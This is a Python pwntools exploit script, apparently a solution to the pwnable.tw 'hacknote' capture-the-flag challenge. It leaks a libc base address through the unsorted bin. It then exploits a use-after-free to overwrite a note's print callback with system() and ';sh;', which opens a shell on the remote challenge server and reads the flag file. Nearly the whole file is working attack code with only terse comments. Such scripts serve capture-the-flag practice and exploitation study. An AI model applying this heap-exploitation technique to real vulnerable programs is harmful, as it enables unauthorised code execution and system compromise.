from pwn import *

DEBUG = 0
r = None

dummy = b'\x0a'
unsorted_bin_chk_size = b'130'
fastbin_chk_size = b'10'

libc_main_arena2base = 0x1b07b0

def add_note(size, content):
	r.recvuntil(b'Your choice :')
	r.sendline(b'1')

	r.recvuntil(b'Note size :')
	r.sendline(size)

	r.recvuntil(b'Content :')
	r.send(content)

def delete_note(idx):
	r.recvuntil(b'Your choice :')
	r.sendline(b'2')

	r.recvuntil(b'Index :')
	r.sendline(idx)

def print_note(idx):
	r.recvuntil(b'Your choice :')
	r.sendline(b'3')

	r.recvuntil(b'Index :')
	r.sendline(idx)


if DEBUG:
	r = process('./hacknote')
	context.log_level = 'debug'
else:
	r = remote('chall.pwnable.tw', 10102)

elf = ELF('./hacknote')
libc = ELF('./liba/libc.so.6')

# get a libc leak via unsorted bin main arena address

## create 2 chunks. The second one is for large chunk won't be consolidated with topchunk
add_note(unsorted_bin_chk_size, dummy)
add_note(fastbin_chk_size, dummy)

## delete first of them (glibc allocator will put addresses of main arena to 'fd' & 'bk' fields)
delete_note(b'0')

## create chunk with same size
add_note(unsorted_bin_chk_size, dummy)
print_note(b'0')

## get a leak
libc_leak = u32(r.recv(8)[4:])
libc_base = libc_leak - libc_main_arena2base
sys = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

log.success(f'Libc base : {hex(libc_base)}')
log.success(f'system() : {hex(sys)}')
log.success(f'/bin/sh : {hex(bin_sh)}')

# use-after-free to overwrite print_callback
delete_note(b'1')
delete_note(b'0')

add_note(fastbin_chk_size, p32(sys) + b';sh;')

# trigger attack
print_note(b'1')

sleep(0.1)

r.sendline(b'cat /home/hacknote/flag')
flag = r.recvline().decode().strip()

log.success(f'flag : {flag}')

r.close()
